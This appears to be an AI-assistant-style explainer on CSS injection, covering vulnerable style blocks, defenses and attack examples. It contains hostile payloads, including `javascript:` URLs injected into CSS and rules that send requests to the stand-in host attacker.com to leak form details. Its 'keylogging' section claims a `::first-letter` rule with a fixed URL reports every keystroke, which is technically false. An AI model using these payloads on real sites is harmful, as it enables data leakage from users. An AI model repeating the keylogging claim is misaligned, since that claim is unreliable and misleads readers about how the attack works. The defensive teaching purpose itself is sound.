Code injection through CSS is a concept often associated with exploiting vulnerabilities in web applications, particularly when an attacker can inject or manipulate CSS in a way that triggers unintended behavior. Let's break this down:

---

### **1. Understanding CSS Injection**
CSS injection occurs when a web application allows user input to be included in a style block or as part of a style attribute without proper sanitization. If attackers can control the input, they may manipulate how the page is displayed or interact with sensitive data.

### **2. Example of CSS Injection**
Suppose a web application has an input form that includes user-supplied input directly in the `<style>` tag or `style` attribute. An attacker might exploit it like this:

#### Vulnerable Code:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>CSS Injection Example</title>
    <style>
        .user-style {
            color: black; /* User-controlled input */
        }
    </style>
</head>
<body>
    <div class="user-style">User content here</div>
</body>
</html>
```

If the `color` value is derived from user input without sanitization, an attacker might inject:

```css
color: black; background-image: url('javascript:alert(1)');
```

This could trigger a JavaScript execution in some browsers, but modern browsers typically block `javascript:` URLs in CSS due to security updates.

---

### **3. CSS Injection Leading to Information Disclosure**
In some cases, attackers might leverage CSS to infer sensitive information (e.g., the dimensions or visibility of certain elements):

#### Example:
```css
input[type="password"] {
    background: url('http://attacker.com/log?password-input-exists');
}
```

This sends a request to the attacker's server whenever the targeted CSS rule matches, which might reveal information about the user's form inputs.

---

### **4. Defenses Against CSS Injection**
To protect against CSS injection, follow these best practices:

- **Validate and Sanitize Inputs:** Never trust user input directly. Use input validation and sanitization techniques.
- **Content Security Policy (CSP):** Implement a strict CSP to prevent loading malicious resources or executing inline styles/scripts.
- **Escape Outputs:** Properly escape any user-supplied input included in CSS or HTML attributes.
- **Use Whitelists for CSS Properties:** Limit allowable values to a predefined safe set.
- **Avoid Inline CSS:** Avoid dynamically adding user-controlled data to inline styles.

---

### **5. CSS Injection with Inline Styles**
Injection can also occur in attributes like `style`. For example:

```html
<div style="background-color: {{userInput}}">Content</div>
```

If `userInput` is not sanitized, it could contain something like:

```css
background-color: red; background-image: url('javascript:alert(1)');
```

This could manipulate styles or attempt to execute JavaScript.

---

### **6. Real-World Attack Example**
CSS injection can be used creatively to perform pixel-stealing attacks or keylogging:

#### Example: Keylogging
Attackers inject styles that reveal information about keystrokes:
```css
input[type="text"]::first-letter {
    background: url('http://attacker.com/char?c=a');
}
```

For every keystroke, the browser sends a request to `attacker.com` with the input's first letter.

---

### Summary
While CSS injection isn't as directly dangerous as JavaScript injection (e.g., XSS), it can still lead to:

- Visual manipulation of the page.
- Information leakage.
- Resource-based attacks.

To prevent CSS injection, always validate and sanitize user inputs, escape outputs, and enforce a strong Content Security Policy.
